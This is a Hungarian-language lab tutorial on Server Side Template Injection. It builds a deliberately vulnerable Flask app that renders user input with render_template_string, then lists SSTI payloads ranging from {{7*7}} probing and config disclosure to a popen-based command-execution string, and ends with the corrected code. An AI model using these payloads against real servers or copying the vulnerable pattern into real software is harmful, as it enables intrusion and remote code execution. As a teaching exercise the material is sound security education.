# Server Side Template Injection (SSTI)

## Rendszerterv

Az SSTI-t egy egyszerű (egyetlen fájlból álló) Flash webalkalmazáson
keresztül fogjuk megvizsgálni. Ehhez szükségünk van a Fask csomagra,
amit egy `venv`-ben fogunk telepíteni. 

## A webszerver telepítése

A webszervert a következő paranccsal tudjuk telepíteni:

```bash
sudo apt install python3-venv
python3 -m venv ssti
cd ssti
. bin/activate
pip install flask
```

```bash
cat > app.py
```

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
</head>
<body>
    <h1>SSTI Demo</h1>
    <form method="POST" action="/hello">
        Name:<br><br>
        <input type="text" name="name" size="40" required>
        <br><br>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
    """

@app.route("/hello", methods=["POST"])
def greet():
    name = request.form.get("name", "Guest")
    template = f"Hello {name}!"

    return render_template_string(template)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

```bash
python app.py
```

```
{{7*7}}
```

```
{{config}}
{{ ''.__class__ }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

```python
return render_template_string("Hello {{ name }}!", name=name)
```
